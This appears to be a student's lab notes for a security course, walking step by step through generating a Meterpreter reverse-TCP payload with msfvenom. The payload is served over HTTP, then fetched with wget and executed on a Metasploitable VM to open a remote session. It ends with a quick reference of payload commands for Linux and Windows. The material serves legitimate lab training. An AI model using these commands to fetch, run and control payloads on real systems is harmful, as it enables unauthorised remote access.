# Payload Delivery and Meterpreter

**Tags:** #budding #INT245 #security #metasploit #meterpreter

## Part B — Payload Delivery, Meterpreter & Banner Grabbing

> Open **3 terminal tabs** on Kali for this section.

### Step 1 — Generate Linux Payload (Terminal 1)

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp \
  LHOST=192.168.56.<KALI_HOSTONLY_LAST_OCTET> \
  LPORT=4444 \
  -f elf \
  -o /tmp/shell.elf

chmod +x /tmp/shell.elf
ls -la /tmp/shell.elf
```

> Use Kali's **Host-Only** IP (192.168.56.x), not 10.0.2.15

### Step 2 — Host Payload via Python HTTP Server (Terminal 1)
```bash
cd /tmp
python3 -m http.server 8080
```

### Step 3 — Configure multi/handler (Terminal 2)
```bash
msfconsole -q
```
```
use exploit/multi/handler
set payload linux/x86/meterpreter/reverse_tcp
set LHOST 192.168.56.<KALI_HOSTONLY>
set LPORT 4444
show options
exploit
```

Output:
```
[*] Started reverse TCP handler on 192.168.56.X:4444
```

### Step 4 — Transfer & Execute on Metasploitable (Terminal 3)
```bash
ssh msfadmin@192.168.56.102
# password: msfadmin
```

Inside Metasploitable:
```bash
wget http://192.168.56.<KALI_HOSTONLY>:8080/shell.elf -O /tmp/shell.elf
chmod +x /tmp/shell.elf
/tmp/shell.elf &
```

### Step 5 — Session Established

Terminal 2 shows:
```
[*] Sending stage (984904 bytes) to 192.168.56.102
[*] Meterpreter session 1 opened

meterpreter >
```

### Quick Reference for msfvenom
```bash
# Linux 32-bit (Metasploitable)
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.56.X LPORT=4444 -f elf -o shell.elf

# Linux 64-bit
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.56.X LPORT=4444 -f elf -o shell.elf

# Windows
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.X LPORT=4444 -f exe -o shell.exe
```
